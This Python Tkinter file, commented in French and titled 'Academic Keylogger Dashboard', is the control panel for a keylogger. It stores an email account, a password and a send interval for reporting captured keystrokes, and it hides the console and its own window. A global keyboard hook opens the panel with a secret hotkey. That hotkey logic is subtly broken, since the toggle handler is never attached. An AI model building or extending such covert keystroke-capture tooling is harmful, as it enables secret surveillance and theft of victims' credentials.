import tkinter as tk
from tkinter import messagebox
import json
import os
import signal
import ctypes
from pynput import keyboard

CONFIG_PATH = "config.json"
PID_FILE = "pid.txt"

# Style global pour uniformiser le design
BG_COLOR = "#1e1e1e"
FG_COLOR = "#ffffff"
BTN_COLOR = "#e63946"
ENTRY_BG = "#2c2c2c"

class KeyloggerInterface:
    def __init__(self):
        # Création de la fenêtre principale Tkinter
        self.root = tk.Tk()
        self.root.title("Academic Keylogger Dashboard")
        self.root.geometry("400x320")
        self.root.configure(bg=BG_COLOR)
        self.root.resizable(False, False)
        # Quand on clique sur la croix, on cache la fenêtre au lieu de la fermer
        self.root.protocol("WM_DELETE_WINDOW", self.hide_window)

        # Construction des widgets de l'interface
        self.create_widgets()

        # Chargement des valeurs de configuration dans les champs
        self.load_config()

        # Installation du raccourci clavier Ctrl+Alt+F6 pour afficher/cacher le dashboard
        self.setup_hotkey()

    def create_widgets(self):
        # Titre
        tk.Label(self.root, text="Dashboard", font=("Segoe UI", 16, "bold"),
                 bg=BG_COLOR, fg="#00ffff").pack(pady=10)

        # Variables Tkinter associées aux champs
        self.email_var = tk.StringVar()
        self.password_var = tk.StringVar()
        self.interval_var = tk.StringVar()

        # Champs avec labels pour Email, Password et Intervalle d'envoi
        self.create_labeled_entry("Email:", self.email_var)
        self.create_labeled_entry("Password:", self.password_var, show="*")
        self.create_labeled_entry("Interval (s):", self.interval_var)

        # Bouton pour enregistrer la configuration
        tk.Button(self.root, text="💾 Save Changes", command=self.save_config,
                  bg="#007bff", fg="white", relief="flat").pack(pady=10)

        # Bouton pour arrêter le keylogger (tue le processus via PID)
        tk.Button(self.root, text="🛑 Stop Now", command=self.stop_keylogger,
                  bg=BTN_COLOR, fg="white", relief="flat").pack(pady=5)

    def create_labeled_entry(self, label, var, show=None):
        # Crée un cadre contenant un label et un champ d'entrée
        frame = tk.Frame(self.root, bg=BG_COLOR)
        frame.pack(pady=5)
        tk.Label(frame, text=label, width=12, anchor="w", bg=BG_COLOR, fg=FG_COLOR).pack(side="left")
        entry = tk.Entry(frame, textvariable=var, bg=ENTRY_BG, fg=FG_COLOR,
                         relief="flat", width=25, show=show)
        entry.pack(side="right", padx=10)

    def load_config(self):
        # Charge la config depuis le fichier JSON
        try:
            with open(CONFIG_PATH, "r") as f:
                config = json.load(f)
            self.email_var.set(config.get("email", ""))
            self.password_var.set(config.get("password", ""))
            self.interval_var.set(str(config.get("interval", "")))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load config: {e}")

    def save_config(self):
        # Sauvegarde la config dans le fichier JSON
        try:
            with open(CONFIG_PATH, "w") as f:
                json.dump({
                    "email": self.email_var.get(),
                    "password": self.password_var.get(),
                    "interval": int(self.interval_var.get())
                }, f, indent=4)
            messagebox.showinfo("Success", "Config saved!")
            self.hide_window()  # Cache automatiquement la fenêtre après sauvegarde
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save config: {e}")

    def stop_keylogger(self):
        # Tente de stopper le keylogger via son PID stocké dans pid.txt
        if not os.path.exists(PID_FILE):
            messagebox.showwarning("Missing", "pid.txt not found.")
            return
        try:
            with open(PID_FILE, "r") as f:
                pid = int(f.read().strip())
            os.kill(pid, signal.SIGTERM)
            messagebox.showinfo("Success", f"Process {pid} terminated.")
        except Exception as e:
            messagebox.showerror("Error", f"Could not stop : {e}")

    def hide_window(self):
        # Cache la fenêtre (pour qu’elle disparaisse)
        self.root.withdraw()

    def toggle_visibility(self):
        # Affiche ou cache la fenêtre selon son état actuel
        if self.root.state() == "withdrawn":
            self.root.deiconify()
            self.root.lift()
        else:
            self.root.withdraw()

    def setup_hotkey(self):
        # Utilise pynput pour écouter les touches Ctrl, Alt et F6
        def on_press(key):
            try:
                if key == keyboard.Key.f6 and self.ctrl_pressed and self.alt_pressed:
                    self.toggle_visibility()
            except:
                pass

        def on_release(key):
            if key == keyboard.Key.ctrl_l:
                self.ctrl_pressed = False
            if key == keyboard.Key.alt_l:
                self.alt_pressed = False

        def on_key(key):
            if key == keyboard.Key.ctrl_l:
                self.ctrl_pressed = True
            if key == keyboard.Key.alt_l:
                self.alt_pressed = True

        self.ctrl_pressed = False
        self.alt_pressed = False

        listener = keyboard.Listener(on_press=on_key, on_release=on_release)
        listener.start()

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    # Cache la console Windows à l'exécution pour que seul le dashboard soit visible
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    app = KeyloggerInterface()
    app.run()
